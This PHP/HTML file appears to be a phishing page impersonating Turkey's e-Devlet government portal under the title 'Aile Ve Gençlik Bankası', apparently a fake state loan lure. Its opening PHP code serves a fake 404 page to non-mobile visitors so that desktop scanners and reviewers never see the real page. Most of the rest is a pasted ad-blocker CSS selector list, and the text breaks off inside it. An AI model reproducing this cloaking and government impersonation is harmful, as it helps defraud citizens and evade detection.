<?php
$mobileDevices = array('iPhone','iPad','Android','Windows Phone');
$userAgent = $_SERVER['HTTP_USER_AGENT'];

$isMobile = false;
foreach ($mobileDevices as $device) {
    if (strpos($userAgent, $device) !== false) {
        $isMobile = true;
        break;
    }
}

if (!$isMobile) {
    // Mobil olmayan kullanıcılara boş bir sayfa göster
    echo '<!DOCTYPE html>
    <html>
    <head>
        <title></title>
    </head>
    <body>
        <h1>404 Not Found</h1>
    </body>
    </html>';

    exit();
}
?>

<html lang="tr" class=" test-es5object test-supports test-csstransforms3d test-webpalpha test-webplossless"><!--<![endif]--><head>
        <meta charset="utf-8">
        <link rel="dns-prefetch" href="">
        <meta http-equiv="x-ua-compatible" content="IE=edge">
	        <meta property="al:android:url" content="edevlet://hizmet/1512">		
        <meta property="og:image" content="/themes/ankara/images/fb-share-v01.jpg">
	        <title>Aile Ve Gençlik Bankası</title>
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#1C3761">
        <link rel="icon" type="image/png" href="/themes/izmir/images/favicons/favicon-196x196.1.8.png" sizes="196x196">
        <meta name="google-play-app" content="app-id=tr.gov.turkiye.edevlet.kapisi">
        <link rel="alternate" type="application/rss+xml" title="e-Devlet Kapısı" href="/rss">
        <link rel="stylesheet" href="./base.1.8.css">
            <link href="https://cdn.e-devlet.gov.tr/themes/izmir/css/common-pages.1.8.css" rel="stylesheet">

		        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1">
        <meta http-equiv="x-ua-compatible" content="IE=edge">
                <meta name="robots" content="noindex, nofollow">    
            <title>Aile Ve Gençlik Bankası</title>
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#1C3761">

		<script src="./bridge.v16.1.7.js" defer=""></script>
		<script id="info_js" data-static-version="1.7" src="./header.1.7.js"></script>
        <!--[if lte IE 9]><script src="//cdn.e-devlet.gov.tr/themes/izmir/js/common-old.1.8.js"></script><![endif]-->
        <!--[if gt IE 9]><!--><script src="./common.1.8.js"></script><!--<![endif]-->
        <link href="https://cdn.e-devlet.gov.tr/themes/izmir/css/common-pages.1.8.css" rel="stylesheet">
<style type="text/css">:root topadblock, :root span[id^="ezoic-pub-ad-placeholder-"], :root mq-programmatic-ad, :root iframe[src^="http://www.adpeepshosted.com/adpeeps.php?"], :root div[id^="traffective-ad-"], :root div[id^="taboola-stream-"], :root div[id^="rc-widget-"], :root div[id^="lazyad-"], :root div[id^="js-dfp-"], :root div[id^="gtm-ad-"], :root div[id^="google_dfp_"], :root div[id^="ezoic-pub-ad-"], :root div[id^="div-adtech-ad-"], :root div[id^="dfp-slot-"], :root div[id^="dfp-ad-"], :root div[id^="banner-ad-"], :root div[id^="advt-"], :root div[id^="advads_"], :root div[id^="advads-"], :root div[id^="adspot-"], :root div[id^="ads300_100-widget-"], :root div[id^="ads250_250-widget-"], :root div[id^="adrotate_widgets-"], :root div[id^="adngin-"], :root div[id^="adfox_"], :root div[id^="ad_script_"], :root div[id^="ad_rect_"], :root div[id^="ad_position_"], :root div[id^="ad-server-"], :root div[id^="ad-inserter-"], :root div[id^="ad-cid-"], :root div[id^="_vdo_ads_player_ai_"], :root div[data-test-id="AdDisplayWrapper"], :root div[data-subscript="Advertising"], :root div[data-spotim-slot], :root div[data-role="sidebarAd"], :root div[data-native_ad], :root div[data-mediatype="advertising"], :root div[data-insertion], :root div[data-id-advertdfpconf], :root div[data-dfp-id], :root div[data-content="Advertisement"], :root div[data-alias="300x250 Ad 2"], :root div[data-alias="300x250 Ad 1"], :root div[data-adunit], :root div[data-adunit-path], :root div[data-before-content="advertisement"], :root div[data-adservice-param-tagid="contentad"], :root div[data-adname], :root div[data-ad-wrapper], :root div[data-ad-underplayer], :root div[data-ad-placeholder], :root div[class^="sp-adslot-"], :root div[class^="s-dfp-"], :root div[class^="pane-google-admanager-"], :root div[class^="native-ad-"], :root div[class^="lifeOnwerAd"], :root div[class^="largeRectangleAd_"], :root div[class^="kiwiad-popup"], :root div[class^="kiwiad-desktop"], :root div[class^="index_adBeforeContent_"], :root div[class^="index_adAfterContent_"], :root div[class^="index__adWrapper"], :root div[class^="block-openx-"], :root div[class^="backfill-taboola-home-slot-"], :root div[class^="articleAdUnitMPU_"], :root div[class^="advertisement-desktop"], :root div[class^="adunit_"], :root div[class^="adsbutt_wrapper_"], :root div[class^="ads-partner-"], :root div[class^="adpubs-"], :root div[class^="adbanner_"], :root div[class^="ad_position_"], :root div[class^="SponsoredAds"], :root div[class^="ResponsiveAd-"], :root div[class^="PreAd_"], :root div[class^="Display_displayAd"], :root div[class^="Directory__footerAds"], :root div[class^="Component-dfp-"], :root div[class^="BlockAdvert-"], :root div[class^="BannerAd_"], :root div[class^="AdhesionAd_"], :root div[class^="Ad__bigBox"], :root div[class^="Ad__adContainer"], :root div[class^="AdSlot__container"], :root div[class^="ad_border_"], :root div[class^="AdItem-"], :root div[class^="AdEmbeded__AddWrapper"], :root span[data-component-type="s-ads-metrics"], :root div[class^="AdBannerWrapper-"], :root div[id^="code_ads_"], :root div.fadeInDown[id$="____equal"][class$="____equal"], :root display-ads, :root display-ad-component, :root aside[id^="tn_ads_widget-"], :root aside[id^="adrotate_widgets-"], :root app-large-ad, :root amp-fx-flying-carpet, :root amp-embed[type="taboola"], :root aa[href^="https://itubego.com/video-downloader/?affid="], :root a[target="_blank"][onmousedown="this.href^='http://paid.outbrain.com/network/redir?"], :root a[onmousedown^="this.href='http://paid.outbrain.com/network/redir?"][target="_blank"], :root a[href^="https://x.trafficandoffers.com/"], :root a[href^="https://www.xvinlink.com/?a_fid="], :root a[href^="https://www.what-sexdating.com/"], :root a[href^="https://www.vfreecams.com/in/?track="], :root a[href^="https://www.sweetdeals.com"], :root a[href^="https://www.sugarinstant.com/?partner_id="], :root a[href^="https://www.sheetmusicplus.com/"][href*="?aff_id="], :root a[href^="https://www.share-online.biz/affiliate/"], :root a[href^="https://www.securegfm.com/"], :root a[href^="https://www.rcbopt.com:8080/offer/"] > img, :root a[href^="https://www.rabbits.webcam/?id="], :root a[href^="https://www.purevpn.com/"][href*="&utm_source=aff-"], :root a[href^="https://www.privateinternetaccess.com/"] > img, :root a[href^="https://www.passeura.com/"], :root div[id^="amzn-assoc-ad"], :root a[href^="https://www.oboom.com/ref/"], :root a[href^="https://www.oboom.com/ad/"], :root a[href^="https://www.nudeidols.com/cams/"], :root a[href^="https://www.mypornstarcams.com/landing/click/"], :root a[href^="https://www.mrskin.com/account/"], :root a[href^="https://www.kingsoffetish.com/tour?partner_id="], :root a[href^="https://www.jackery.com?aff="] > img, :root div[data-adzone], :root a[href^="https://www.iyalc.com/"], :root a[onmousedown^="this.href='http://paid.outbrain.com/network/redir?"][target="_blank"] + .ob_source, :root a[href^="https://www.infowarsstore.com/"] > img, :root div[id^="yandex_ad"], :root a[href^="https://www.pornhat.com/"][rel="nofollow"], :root a[href^="https://www.hotgirls4fuck.com/"], :root a[href^="https://www.healthrangerstore.com/"] > img, :root a[href^="https://www.get-express-vpn.com/offer/"], :root a[href^="https://www.gambling-affiliation.com/cpc/"], :root a[href^="https://www.dollps.com/?track="], :root a[href^="https://www.clicktraceclick.com/"], :root a[href^="https://www.chngtrack.com/"], :root a[href^="https://www.camsoda.com/enter.php?id="], :root a[href^="https://www.brazzersnetwork.com/landing/"], :root a[href^="https://www.bebi.com"], :root div[class^="pane-adsense-managed-"], :root a[href^="https://www.bang.com/?aff="], :root .card-captioned.crd > .crd--cnt > .s2nPlayer, :root a[href^="https://www.arthrozene.com/"][href*="?tid="], :root a[href^="https://www.adskeeper.co.uk/"], :root a[href^="http://farm.plista.com/pets"], :root a[href^="https://windscribe.com/promo/"], :root [href^="/ucdownload.php"], :root a[href^="https://wantopticalfreelance.com/"], :root a[href^="https://easygamepromo.com/ef/custom_affiliate/"], :root a[href^="https://tupitea.co/"], :root a[href^="http://c43a3cd8f99413891.com/"], :root a[href^="https://trust.zone/go/r.php?RID="], :root div[data-ad-targeting], :root a[href^="https://trk.moviesflix4k.xyz/"], :root a[href^="https://trf.bannerator.com/"], :root a[href^="https://bestcond1tions.com/"], :root a[href^="http://go.247traffic.com/"], :root a[href^="https://trappist-1d.com/"], :root a[href^="https://tragency-clesburg.icu/"], :root a[href^="https://tracking.gitads.io/"], :root [href^="https://turtlebids.irauctions.com/"] img, :root [href*="incentrev.com/"] img, :root a[href^="https://tracking.avapartner.com/"], :root a[href^="https://track.ultravpn.com/"], :root [href^="https://wct.link/"], :root a[href^="https://track.totalav.com/"], :root a[href^="https://track.interactivegf.com/"], :root a[href^="https://vlnk.me/"], :root a[href^="https://www.adultempire.com/"][href*="?partner_id="], :root a[href^="https://track.healthtrader.com/"], :root a[href^="http://greensmoke.com/"], :root a[href^="https://track.effiliation.com/servlet/effi.click?"] > img, :root a[href^="https://track.clickmoi.xyz/"], :root a[href^="https://track.afcpatrk.com/"], :root a[href^="https://control.trafficfabrik.com/"], :root a[href^="https://track.52zxzh.com/"], :root a[href^="http://www.greenmangaming.com/?tap_a="], :root a[href^="https://go.cmtaffiliates.com/"], :root a[href^="https://tm-offers.gamingadult.com/"], :root a[href^="https://t.hrtyj.com/"], :root a[href^="https://t.adating.link/"], :root a[href^="https://streamate.com/landing/click/"], :root a[href^="https://squren.com/rotator/?atomid="], :root div[id^="ad-div-"], :root a[href^="https://secure.eveonline.com/ft/?aid="], :root a[href^="https://secure.bstlnk.com/"], :root div[class^="index_displayAd_"], :root a[href^="http://adultgames.xxx/"], :root a[href^="http://semi-cod.com/clicks/"], :root a[href^="https://s.zlink2.com/"], :root a[href^="https://someperceptionparade.com/"], :root a[href^="https://refpasrasw.world/"], :root div[data-google-query-id], :root a[href^="https://mediaserver.entainpartners.com/renderBanner.do?"], :root a[href^="https://refpaexhil.top/"], :root a[href^="https://reachtrgt.com/"], :root a[href^="https://queersodadults.com/"], :root AD-SLOT, :root a[href^="https://pubads.g.doubleclick.net/"], :root a[href^="https://prf.hn/click/"][href*="/camref:"] > img, :root a[href^="http://www.my-dirty-hobby.com/?sub="], :root a[href^="https://porndeals.com/?track="], :root a[href^="https://pcm.bannerator.com/"], :root a[href^="https://offerforge.net/"], :root a[href^="https://track.wg-aff.com"], :root a[href^="https://nutrientassumptionclaims.com/"], :root a[href^="https://ndt5.net/"], :root a[href^="https://natour.naughtyamerica.com/track/"], :root a[href^="https://wittered-mainging.com/"], :root a[href^="https://t.grtyi.com/"], :root a[href^="https://myusenet.xyz/"], :root a[href^="https://msecure117.com/"], :root [href^="https://detachedbates.com/"], :root a[href^="https://mk-cdn.net/"], :root a[href^="https://mk-ads.com/"], :root a[href^="https://meet-sex-here.com/?u="], :root a[href^="https://medleyads.com/"], :root a[href^="https://mediaserver.gvcaffiliates.com/renderBanner.do?"], :root a[href^="https://lead1.pl/"], :root iframe[src^="https://tpc.googlesyndication.com/"], :root a[href^="https://a.bestcontentoperation.top/"], :root a[href^="https://landing1.brazzersnetwork.com"], :root a[href^="https://refpazkjixes.top/"], :root a[href^="http://adrunnr.com/"], :root a[href^="https://landing.brazzersplus.com/"], :root a[href^="https://land.rk.com/landing/"], :root a[href^="https://k2s.cc/pr/"], :root a[href^="https://juicyads.in/"], :root a[href^="https://join.virtuallust3d.com/"], :root [href="https://ourgoldguy.com/contact/"] img, :root a[href^="http://www.uniblue.com/cm/"], :root a[href^="https://join.sexworld3d.com/track/"], :root a[href^="https://join.dreamsexworld.com/"], :root a[href^="https://trusted-click-host.com/"], :root a[href^="https://members.linkifier.com/public/affiliateLanding?refCode="], :root a[href^="https://jmp.awempire.com/"], :root a[href^="https://intenseaffiliates.com/redirect/"], :root [id^="ad_sky"], :root [href^="http://join.shemalepornstar.com/"], :root a[href^="https://incisivetrk.cvtr.io/click?"], :root a[href^="https://iactrivago.ampxdirect.com/"], :root a[href^="https://iac.ampxdirect.com/"], :root a[href^="https://horny-pussies.com/tds"], :root a[href^="http://feedads.g.doubleclick.net/"], :root a[href^="https://redsittalvetoft.pro/"], :root a[href^="https://googleads.g.doubleclick.net/pcs/click"], :root a[href^="//thaudray.com/"], :root a[href^="http://cdn.adstract.com/"], :root a[href^="https://gogoman.me/"], :root a[href^="https://graizoah.com/"], :root a[href^="https://go.zybrdr.com"], :root a[href^="https://go.xxxjmp.com"], :root a[href^="https://go.xtbaffiliates.com/"], :root bottomadblock, :root a[href^="https://go.xlivrdr.com"], :root a[href^="https://torrentsafeguard.com/?aid="], :root [href^="https://v.investologic.co.uk/"], :root a[href^="https://offers.refchamp.com/"], :root a[href^="https://go.trkclick2.com/"], :root a[href^="https://go.strpjmp.com/"], :root a[href^="https://go.markets.com/visit/?bta="], :root a[href^="https://landing.brazzersnetwork.com/"], :root a[href^="https://go.hpyjmp.com/"], :root a[href^="https://go.goasrv.com/"], :root a[href^="https://adnetwrk.com/"], :root a[href^="https://go.gldrdr.com/"], :root a[href^="https://fleshlight.sjv.io/"], :root a[href^="https://go.etoro.com/"] > img, :root a[href^="https://go.currency.com/"], :root a[href^="https://track.afftck.com/"], :root a[href^="https://gohere.pl/"], :root a[href^="http://guideways.info/"], :root a[href^="https://go.cmrdr.com/"], :root [href^="http://www.pingperfect.com/aff.php"], :root a[href^="http://www.easydownloadnow.com/"], :root a[href^="https://go.alxbgo.com/"], :root a[href^="https://go.admjmp.com/"], :root a[href^="https://go.ad2up.com/"], :root a[href^="https://giftsale.co.uk/?utm_"], :root a[href^="http://www.terraclicks.com/"], :root a[href^="https://gghf.mobi/"], :root a[href^="https://fonts.fontplace9.com/"], :root a[href^="http://clkmon.com/adServe/"], :root a[href^="https://flirtaescopa.com/"], :root a[href^="https://fertilitycommand.com/"], :root a[href^="https://axdsz.pro/"], :root a[href^="https://tour.mrskin.com/"], :root a[href^="https://www.goldenfrog.com/vyprvpn?offer_id="][href*="&aff_id="], :root a[href^="https://fastestvpn.com/lifetime-special-deal?a_aid="], :root a[href^="https://fakelay.com/"], :root a[href^="https://earandmarketing.com/"], :root [lazy-ad="leftthin_banner"], :root a[href^="https://dynamicadx.com/"], :root div[id^="div-gpt-"], :root a[href^="https://dooloust.net/"], :root a[href^="https://tc.tradetracker.net/"] > img, :root a[href^="//srv.buysellads.com/"], :root a[href^="https://dianches-inchor.com/"], :root a[href^="http://adf.ly/?id="], :root a[href^="https://uncensored3d.com/"], :root a[href^="https://creacdn.top-convert.com/"], :root iframe[src^="https://pagead2.googlesyndication.com/"], :root a[href^="https://retiremely.com/"], :root a[href^="https://cpmspace.com/"], :root [onclick*="content.ad/"], :root a[href^="https://clixtrac.com/"], :root a[href^="https://clicks.pipaffiliates.com/"], :root .commercial-unit-mobile-top > .v7hl4d, :root a[href^="https://click.plista.com/pets"], :root a[href^="https://claring-loccelkin.com/"], :root [data-d-ad-id], :root a[href^="https://chaturbate.xyz/"], :root a[href^="https://chaturbate.com/in/?track="], :root a[href^="https://chaturbate.com/in/?tour="], :root a[href^="https://go.xlviirdr.com"], :root a[href^="https://chaturbate.com/affiliates/"], :root #kt_player > a[target="_blank"], :root a[href^="https://camfapr.com/landing/click/"], :root a[href^="https://my-movie.club/"], :root a[href^="https://bluedelivery.pro/"], :root a[href^="https://cam4com.go2cloud.org/"], :root a[href^="https://avtub.click/assets/link.php"], :root a[href^="https://cagothie.net/"], :root a[href^="https://burpee.xyz/"], :root a[href^="https://mcdlks.com/"], :root a[href^="https://bs.serving-sys.com"], :root a[href^="https://blackorange.go2cloud.org/"], :root [data-dynamic-ads], :root a[href^="https://banners.livepartners.com/"], :root a[href^="https://awptjmp.com/"], :root a[href^="http://www.fleshlight.com/"], :root a[href^="https://aweptjmp.com/"], :root a[href^="https://awentw.com/"], :root [href^="/ucdownloader.php"], :root a[href^="https://awejmp.com/"], :root a[href^="https://ausoafab.net/"], :root a[href^="https://as.sexad.net/"], :root a[href^="https://playuhd.host/"], :root a[href^="https://as.conjectwatson.com/"], :root [href^="https://www.restoro.com/"], :root a[href^="https://americafirstpolls.com/"], :root ark-top-ad, :root a[href^="http://bestorican.com/"], :root [data-name="adaptiveConstructorAd"], :root a[href^="https://galaxyroms.net/?scr="], :root a[href^="https://albionsoftwares.com/"], :root a[href^="https://www.mrskin.com/tour"], :root a[href^="http://adserver.adtech.de/"], :root a[href^="https://frameworkdeserve.com/"], :root zeus-ad, :root a[href^="https://aj1070.online/"], :root a[href^="http://cdn3.adexprts.com/"], :root a[href^="https://spygasm.com/track?"], :root a[href^="https://agacelebir.com/"], :root a[href^="https://geniusdexchange.com/"], :root a[href^="//postlnk.com/"], :root a[href^="https://affiliate.rusvpn.com/click.php?"], :root [data-role="tile-ads-module"], :root a[href^="https://affiliate.geekbuying.com/gkbaffiliate.php?"], :root [href^="https://www.reimageplus.com/"], :root a[href^="https://bongacams2.com/track?"], :root a[href^="http://www.twinplan.com/AF_"], :root a[href^="https://affcpatrk.com/"], :root a[href^="https://adultfriendfinder.com/go/page/landing"], :root a[href^="https://adswick.com/"], :root ADS-RIGHT, :root a[href^="https://tracking.trackcasino.co/"], :root a[href^="https://adserver.adreactor.com/"], :root a[href^="https://land.brazzersnetwork.com/landing/"], :root a[href^="https://ads.leovegas.com/redirect.aspx?"], :root a[href^="https://t.hrtye.com/"], :root a[href^="https://ads.cdn.live/"], :root a[href^="https://ads.betfair.com/redirect.aspx?"], :root a[href^="https://refpaano.host/"], :root a[href^="https://meet-to-fuck.com/tds"], :root a[href^="https://adhealers.com/"], :root a[href^="http://servicegetbook.net/"], :root a[href^="https://bngpt.com/"], :root a[href^="http://clickandjoinyourgirl.com/"], :root a[href^="https://ad13.adfarm1.adition.com/"], :root a[href^="https://ad.kubiccomps.icu/"], :root a[href^="https://static.fleshlight.com/images/banners/"], :root app-advertisement, :root a[href^="https://ad.doubleclick.net/"], :root a[href^="http://zevera.com/afi.html"], :root a[href^="http://go.oclaserver.com/"], :root a[href^="https://ad.atdmt.com/"], :root div[id^="gpt_ad_"], :root [href^="https://goldcometals.com/clk.trk"], :root a[href^="https://cams.imagetwist.com/in/?track="], :root .trc_rbox .syndicatedItem, :root a[href^="https://a.bestcontentweb.top/"], :root a[href^="https://aaucwbe.com/"], :root a[href^="https://topoffers.com/"][href*="/?pid="], :root a[href^="https://a2.adform.net/"], :root a[href^="https://a.montangop.top/"], :root a[href^="http://campaign.bharatmatrimony.com/track/"], :root a[href^="https://a-ads.com/campaigns/"], :root a[href^="https://syndication.exoclick.com/"], :root .commercial-unit-mobile-top .jackpot-main-content-container > .UpgKEd + .nZZLFc > .vci, :root a[href^="https://financeads.net/tc.php?"], :root a[href^="https://a-ads.com/?partner="], :root a[href^="http://hyperlinksecure.com/go/"], :root a[href^="https://track.themadtrcker.com/"], :root a[href^="https://bullads.net/get/"], :root a[href^="http://down1oads.com/"], :root a[href^="http://yads.zedo.com/"], :root a[href^="https://ads.trafficpoizon.com/"], :root div[class^="local-feed-banner-ads"], :root a[href^="http://wxdownloadmanager.com/dl/"], :root a[href^="http://www.webtrackerplus.com/"], :root a[href^="http://www.usearchmedia.com/signup?"], :root a[href^="https://twinrdsyn.com/"], :root a[href^="http://www.torntv-downloader.com/"], :root a[href^="http://www.tirerack.com/affiliates/"], :root a[href^="http://www.text-link-ads.com/"], :root a[href^="https://weedzy.co.uk/"][href*="&utm_"], :root a[href^="http://chaturbate.com/affiliates/"], :root a[href^="https://waisheph.com/"], :root a[href^="http://www.streamtunerhd.com/signup?"], :root a[href^="http://www.streamate.com/exports/"], :root a[href^="https://ads-for-free.com/click.php?"], :root a[href^="https://syndication.optimizesrv.com/"], :root a[href^="http://www.socialsex.com/"], :root a[href^="https://join.virtualtaboo.com/track/"], :root a[onmousedown^="this.href='https://paid.outbrain.com/network/redir?"][target="_blank"], :root [href^="https://awbbjmp.com/"], :root a[href^="http://www.sfippa.com/"], :root a[href^="http://secure.signup-page.com/"], :root a[href^="http://www.quick-torrent.com/download.html?aff"], :root a[href^="http://www.plus500.com/?id="], :root [href*=".zlinkm.com/"], :root a[href^="http://www.pinkvisualgames.com/?revid="], :root a[href^="https://trklvs.com/"], :root a[href^="http://www.paddypower.com/?AFF_ID="], :root a[href^="http://www.onwebcam.com/random?t_link="], :root a[href^="http://www.onclickmega.com/jump/next.php?"], :root a[href^="http://www.myfreepaysite.com/sfw.php?aid"], :root a[href^="http://www.mrskin.com/tour"], :root a[href^="http://bcntrack.com/"], :root a[href^="http://www.securegfm.com/"], :root a[href^="http://www.liversely.net/"], :root a[href^="https://partners.fxoro.com/click.php?"], :root a[href^="https://azpresearch.club/"], :root a[href^="http://www.linkbucks.com/referral/"], :root a[href^="http://www.idownloadplay.com/"], :root a[href^="http://www.hitcpm.com/"], :root a[href^="http://fusionads.net"], :root a[href^="http://www.hibids10.com/"], :root div[class^="awpcp-random-ads"], :root a[href^="http://www.graboid.com/affiliates/"], :root a[href^="http://www.getyourguide.com/?partner_id="], :root a[href^="http://www.gamebookers.com/cgi-bin/intro.cgi?"], :root a[href^="http://www.friendlyquacks.com/"], :root a[href^="https://www.financeads.net/tc.php?"], :root a[href^="http://www.friendlyduck.com/AF_"], :root a[href^="http://www.firstload.com/affiliate/"], :root a[href^="http://www.friendlyadvertisements.com/"], :root a[href^="http://www.mysuperpharm.com/"], :root a[href^="http://www.freefilesdownloader.com/"], :root a[href^="https://content.oneindia.com/www/delivery/"], :root a[href^="http://www.fpcTraffic2.com/blind/in.cgi?"], :root a[href^="http://www.fonts.com/BannerScript/"], :root a[href^="http://go.seomojo.com/tracking202/"], :root a[href^="http://www.downloadweb.org/"], :root a[href^="http://www.download-provider.org/"], :root a[href^="http://www.down1oads.com/"], :root a[href^="https://scurewall.co/"], :root a[href^="https://pb-track.com/"], :root [href^="https://www.avantlink.com/click.php"] img, :root a[href^="http://www.dealcent.com/register.php?affid="], :root a[href^="https://click.a-ads.com/"], :root a[href^="http://www.clkads.com/adServe/"], :root a[href^="https://aff-ads.stickywilds.com/"], :root a[href^="http://www.bitlord.me/share/"], :root iframe[id^="google_ads_frame"], :root a[href^="http://www.bluehost.com/track/"] > img, :root a[href^="http://www.bet365.com/"][href*="affiliate="], :root .grid > .container > #aside-promotion, :root a[href^="http://www.babylon.com/welcome/index?affID"], :root a[href^="https://fast-redirecting.com/"], :root [href^="http://join.michelle-austin.com/"], :root a[href^="http://www.sexgangsters.com/?pid="], :root a[href^="http://www.amazon.co.uk/exec/obidos/external-search?"], :root a[href^="http://www.afgr3.com/"], :root a[href^="http://c.jumia.io/"], :root a[href^="http://www.affiliates1128.com/processing/"], :root a[href^="http://go.ad2up.com/"], :root a[href^="https://badoinkvr.com/"], :root a[href^="http://www.adxpansion.com"], :root a[href^="https://prf.hn/click/"][href*="/creativeref:"] > img, :root a[href^="http://www.adultempire.com/unlimited/promo?"][href*="&partner_id="], :root a[href^="https://clickadilla.com/"], :root .ob_container .item-container-obpd, :root a[href^="http://websitedhoome.com/"], :root a[href^="http://www.adskeeper.co.uk/"], :root a[href^="http://www.ragazzeinvendita.com/?rcid="], :root a[href^="http://www.adultdvdempire.com/?partner_id="][href*="&utm_"], :root .plistaList > .itemLinkPET, :root a[href^="http://www.adbrite.com/mb/commerce/purchase_form.php?"], :root a[href^="http://www.FriendlyDuck.com/"], :root a[href^="https://www.googleadservices.com/pagead/aclk?"], :root a[href^="http://www.1clickdownloader.com/"], :root a[href^="https://bongacams10.com/track?"], :root a[href^="http://www.123-reg.co.uk/affiliate2.cgi"], :root a[href^="http://wopertific.info/"], :root a[href^="http://bodelen.com/"], :root a[href^="http://wgpartner.com/"], :root a[href^="http://webtrackerplus.com/"], :root a[href^="http://web.adblade.com/"], :root [href^="https://stvkr.com/"], :root a[href^="http://engine.newsmaxfeednetwork.com/"], :root a[href^="https://pl.premium4kflix.website/"], :root a[href^="http://vo2.qrlsx.com/"], :root a[href^="https://www.nutaku.net/signup/landing/"], :root a[href^="http://s9kkremkr0.com/"], :root aside[id^="advads_ad_widget-"], :root a[href^="http://lp.ezdownloadpro.info/"], :root a[href^="http://uploaded.net/ref/"], :root a[href^="//chrif8kdstie.com/"], :root a[href^="https://traffdaq.com/"], :root a[href^="http://ucam.xxx/?utm_"], :root a[href^="http://traffic.tc-clicks.com/"], :root a[href^="https://dediseedbox.com/clients/aff.php?"], :root [href^="/ucmini.php"], :root a[href^="http://www.wantstraffic.com/"], :root [href^="https://trackfin.asia/"], :root a[href^="http://databass.info/"], :root a[href^="http://track.afcpatrk.com/"], :root div[class^="Ad__container"], :root a[href^="http://adprovider.adlure.net/"], :root a[href^="http://t.wowtrk.com/"], :root a[href^="http://tezfiles.com/pr/"], :root a[href^="http://tracking.deltamediallc.com/"], :root a[href^="http://tc.tradetracker.net/"] > img, :root div[class^="adUnit_"], :root a[href^="https://deliver.tf2www.com/"], :root .ob_dual_right > .ob_ads_header ~ .odb_div, :root a[href^="http://spygasm.com/track?"], :root a[href^="http://sharesuper.info/"], :root a[href^="https://awecrptjmp.com/"], :root [data-ez-name], :root a[href^="http://server.cpmstar.com/click.aspx?poolid="], :root a[href^="http://see.kmisln.com/"], :root a[href^="http://secure.hostgator.com/~affiliat/"], :root a[href^="http://rs-stripe.wsj.com/stripe/redirect"], :root a[href^="http://refpaano.host/"], :root a[data-oburl^="http://paid.outbrain.com/network/redir?"], :root a[href^="https://engine.phn.doublepimp.com/"], :root a[href^="http://refpa.top/"], :root a[href^="http://record.betsafe.com/"], :root a[href^="https://iqbroker.com/"][href*="?aff="], :root a[href*=".medgoodfood.com/"], :root a[href^="http://buysellads.com/"], :root a[href^="http://reallygoodlink.freehookupaffair.com/"], :root a[href^="https://keep2share.cc/pr/"], :root a[href^="http://pityhostngco2.xyz/"], :root a[href^="http://adlev.neodatagroup.com/"], :root a[href^="http://reallygoodlink.extremefreegames.com/"], :root a[href^="https://bnsjb1ab1e.com/"], :root a[href^="http://pwrads.net/"], :root a[href^="http://promos.bwin.com/"], :root a[href^="http://z1.zedo.com/"], :root a[href^="http://pokershibes.com/index.php?ref="], :root [id^="google_ads_iframe"], :root a[href^="http://partners.etoro.com/"], :root a[href^="http://searchtabnew.com/"], :root [href^="https://istlnkcl.com/"], :root div[id^="ad-gpt-"], :root a[href^="http://pan.adraccoon.com?"], :root a[href^="http://online.ladbrokes.com/promoRedirect?"], :root a[href^="https://dltags.com/"], :root a[href^="http://onclickads.net/"], :root a[href^="http://mmo123.co/"], :root a[href^="https://fileboom.me/pr/"], :root a[href^="http://marketgid.com"], :root a[href^="//pubads.g.doubleclick.net/"], :root a[href^="http://lp.ncdownloader.com/"], :root a[href^="https://moneynow.one/"], :root a[href^="http://look.djfiln.com/"], :root a[href^="http://keep2share.cc/pr/"], :root a[href^="http://www.liutilities.com/"], :root a[href^="http://www.dl-provider.com/search/"], :root [href^="http://join.shemalesfromhell.com/"], :root .pubexchange_module .pe-external, :root a[data-widget-outbrain-redirect^="http://paid.outbrain.com/network/redir?"], :root a[href^="http://join3.bannedsextapes.com/track/"], :root a[href^="https://gamescarousel.com/"], :root a[href^="http://istri.it/?"], :root a[href^="http://mob1ledev1ces.com/"], :root a[href^="http://www.fbooksluts.com/"], :root a[href^="http://www.cdjapan.co.jp/aff/click.cgi/"], :root a[href^="http://c.actiondesk.com/"], :root [href^="https://www.mypatriotsupply.com/"] > img, :root a[href^="http://intent.bingads.com/"], :root a[href^="//voyeurhit.com/cs/"], :root a[href^="http://hd-plugins.com/download/"], :root [data-desktop-ad-id], :root a[href^="https://look.utndln.com/"], :root a[href^="http://googleads.g.doubleclick.net/pcs/click"], :root a[href^="https://ovb.im/"], :root a[href^="https://watchmygirlfriend.tv/"], :root .nrelate .nr_partner, :root a[href^="http://go.xtbaffiliates.com/"], :root a[href^="https://dialling-abutory.com/"], :root a[href^="https://oackoubs.com/"], :root a[href^="http://install.securewebsiteaccess.com/"], :root a[href^="http://www.revenuehits.com/"], :root a[href^="http://go.mobisla.com/"], :root a[href^="http://go.fpmarkets.com/"], :root a[href^="http://findersocket.com/"], :root a[href^="https://porngames.adult/?SID="], :root a[href^="https://ads.planetwin365affiliate.com/redirect.aspx?"], :root a[href^="//go.xlviiirdr.com"], :root a[href*=".incontro-veloce.com/"], :root a[href^="http://g1.v.fwmrm.net/ad/"], :root a[href^="http://us.marketgid.com"], :root a[href^="http://imads.integral-marketing.com/"], :root a[href^="http://freesoftwarelive.com/"], :root a[href^="http://adtrackone.eu/"], :root span[title="Ads by Google"], :root a[href^="http://finaljuyu.com/"], :root a[href^="https://www.im88trk.com/"], :root a[href^="http://ffxitrack.com/"], :root a[href^="http://ethfw0370q.com/"], :root [href^="http://go.cm-trk2.com/"], :root a[href^="https://maymooth-stopic.com/"], :root a[href^="https://tracking.comfortclick.eu/"], :root [id^="bunyad_ads_"], :root a[href^="http://elitefuckbook.com/"], :root a[href^="http://earandmarketing.com/"], :root div[class^="hp-ad-rect-"], :root a[href^="http://dwn.pushtraffic.net/"], :root a[href^="http://deloplen.com/"], :root a[href^="//edgar2al2larngpoer.com/"], :root #content > #center > .dose > .dosesingle, :root a[href^="http://d2.zedo.com/"], :root a[href^="http://czotra-32.com/"], :root a[href^="https://www.travelzoo.com/oascampaignclick/"], :root a[href^="https://see.kmisln.com/"], :root [href^="https://routewebtk.com/"], :root a[href^="http://refer.webhostingbuzz.com/"], :root a[href^="https://paid.outbrain.com/network/redir?"], :root a[href^="http://clickserv.sitescout.com/"], :root a[href^="http://www.downloadplayer1.com/"], :root a[href^="http://clicks.binarypromos.com/"], :root [id^="ad_slider"], :root a[href^="https://track.bruceads.com/"], :root a[href^="https://t.aslnk.link/"], :root [href^="https://zstacklife.com/"] img, :root a[href^="https://m.do.co/c/"] > img, :root a[href^="http://track.trkvluum.com/"], :root [href^="https://secure.bmtmicro.com/servlets/"], 